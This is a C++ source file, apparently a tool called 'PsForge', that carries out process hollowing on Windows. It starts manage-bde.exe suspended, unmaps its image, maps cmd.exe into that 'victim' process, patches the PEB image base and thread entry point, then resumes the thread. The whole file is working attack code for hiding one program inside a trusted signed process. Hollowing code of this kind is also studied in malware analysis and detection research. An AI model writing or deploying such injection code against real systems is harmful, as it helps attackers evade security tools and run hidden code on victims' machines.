#include <iostream>
#include <string>
#include <memory>
#include <Windows.h>
#include <ShlObj.h>

using NtMapViewOfSectionPtr = NTSTATUS(NTAPI*)(HANDLE sectionHandle, HANDLE processHandle, PVOID* baseAddress,
                                               ULONG_PTR zeroBits, SIZE_T commitSize, PLARGE_INTEGER sectionOffset,
                                               PSIZE_T viewSize, ULONG inheritDisposition,
                                               ULONG allocationType, ULONG win32Protect);
using NtUnmapViewOfSectionPtr = NTSTATUS(NTAPI*)(HANDLE processHandle, PVOID baseAddress);

template <typename CloseRoutine>
class ObjDeleter
{
	CloseRoutine _Closer;
public:
	explicit ObjDeleter(CloseRoutine closeRoutine) : _Closer(closeRoutine)
	{
	}

	void operator()(void* memBlock) const
	{
		if (memBlock && memBlock != INVALID_HANDLE_VALUE)
		{
			_Closer(memBlock);
		}
	}
};

constexpr auto CMD_ENTRY_RVA = 0x18f50;

int main()
{
	std::wcout << L">> PsForge startup . . .\n\n";

	const auto NtMapViewOfSection = reinterpret_cast<NtMapViewOfSectionPtr>(GetProcAddress(
		GetModuleHandleW(L"ntdll.dll"), "NtMapViewOfSection"));
	if (!NtMapViewOfSection)
	{
		std::wcout << L"NtMapViewOfSection not found.\n";
		return EXIT_FAILURE;
	}
	const auto NtUnmapViewOfSection = reinterpret_cast<NtUnmapViewOfSectionPtr>(GetProcAddress(
		GetModuleHandleW(L"ntdll.dll"), "NtUnmapViewOfSection"));
	if (!NtMapViewOfSection)
	{
		std::wcout << L"NtUnmapViewOfSection not found.\n";
		return EXIT_FAILURE;
	}

	std::wcout << L"NtMapViewOfSection: 0x" << NtMapViewOfSection << std::endl;
	std::wcout << L"NtUnmapViewOfSection: 0x" << NtUnmapViewOfSection << std::endl;

	PWSTR sysDirRaw;
	HRESULT hr;
	if ((hr = SHGetKnownFolderPath(FOLDERID_System, 0, nullptr, &sysDirRaw)) != S_OK)
	{
		std::wcout << L"SHGetKnownFolderPath failed. HRESULT: 0x" << std::hex << hr << std::endl;
		return EXIT_FAILURE;
	}
	std::wstring cmdLoc{sysDirRaw}, bitlockerLoc{sysDirRaw};
	CoTaskMemFree(sysDirRaw);
	std::wcout << L"System directory: " << cmdLoc << std::endl;

	ObjDeleter<decltype(&CloseHandle)> objDeleter{CloseHandle};
	const std::unique_ptr<void, decltype(objDeleter)> cmdExe{
		CreateFileW(
			cmdLoc.append(L"\\cmd.exe").c_str(), FILE_EXECUTE | FILE_READ_ACCESS,
			FILE_SHARE_READ | FILE_SHARE_DELETE, nullptr, OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL, nullptr
		),
		objDeleter
	};
	if (cmdExe.get() == INVALID_HANDLE_VALUE)
	{
		std::wcout << L"CreateFileW() failed. Error: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}
	std::wcout << L"Opened cmd.exe binary file\n";

	const std::unique_ptr<void, decltype(objDeleter)> cmdMapping{
		CreateFileMappingW(
			cmdExe.get(), nullptr, SEC_IMAGE | PAGE_READONLY, 0, 0, nullptr),
		objDeleter
	};
	if (!cmdMapping)
	{
		std::wcout << L"CreateFileMappingW() failed. Error: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}
	std::wcout << L"Created cmd.exe file mapping: SEC_IMAGE\n";

	PROCESS_INFORMATION pi;
	STARTUPINFOW si{sizeof STARTUPINFOW, nullptr};

	if (!CreateProcessW(nullptr, const_cast<LPWSTR>(bitlockerLoc.append(L"\\manage-bde.exe /K cls").c_str()), nullptr,
	                    nullptr,
	                    FALSE, CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
	                    nullptr, cmdLoc.substr(0, cmdLoc.find(L"\\cmd.exe")).c_str(), &si, &pi))
	{
		std::wcout << L"CreateProcessW() failed. Error: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}
	std::unique_ptr<void, decltype(objDeleter)> hThread{pi.hThread, objDeleter};
	std::unique_ptr<void, decltype(objDeleter)> hProcess{pi.hProcess, objDeleter};
	std::wcout << L"Launched victim manage-bde.exe process\n";

	CONTEXT cx;
	cx.ContextFlags = CONTEXT_INTEGER;
	if (!GetThreadContext(pi.hThread, &cx))
	{
		std::wcout << L"GetThreadContext() failed. Error: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}
	std::wcout << L"PEB base address: 0x" << reinterpret_cast<PVOID>(cx.Rdx) << std::endl;

	PVOID imageBase;
	if (!ReadProcessMemory(pi.hProcess, reinterpret_cast<PUCHAR>(cx.Rdx) + 0x10, &imageBase, sizeof(PVOID), nullptr))
	{
		std::wcout << L"ReadProcessMemory() failed. Error: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}
	std::wcout << L"Image base address: 0x" << imageBase << std::endl;

	auto status = NtUnmapViewOfSection(pi.hProcess, imageBase);
	if (status)
	{
		std::wcout << L"NtUnmapViewOfSection() failed. NTSTATUS: 0x" << std::hex << status << std::endl;
		return EXIT_FAILURE;
	}
	std::wcout << L"manage-bde.exe image unmapped\n";

	imageBase = nullptr;
	SIZE_T viewSize = 0;
	status = NtMapViewOfSection(cmdMapping.get(), pi.hProcess, &imageBase, 0, 0, nullptr, &viewSize, 2, 0,
	                            PAGE_READONLY);
	if (status)
	{
		std::wcout << L"NtMapViewOfSection() failed. NTSTATUS: 0x" << std::hex << status << std::endl;
		return EXIT_FAILURE;
	}
	std::wcout << L"cmd.exe mapped into remote process\n";

	if (!WriteProcessMemory(pi.hProcess, reinterpret_cast<PUCHAR>(cx.Rdx) + 0x10, &imageBase, sizeof(PVOID), nullptr))
	{
		std::wcout << L"WriteProcessMemory() failed. Error: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}
	std::wcout << L"Wrote new image base address as: 0x" << imageBase << std::endl;

	cx.Rcx = reinterpret_cast<DWORD64>(imageBase) + CMD_ENTRY_RVA;
	if (!SetThreadContext(pi.hThread, &cx))
	{
		std::wcout << L"SetThreadContext() failed. Error: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}
	std::wcout << L"Set new thread context\n";

	if (ResumeThread(pi.hThread) == static_cast<DWORD>(-1))
	{
		std::wcout << L"ResumeThread() failed. Error: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}
	std::wcout << L"Resumed manage-bde.exe thread\n\n>> Hollowing complete!\n\n";

	return 0;
}
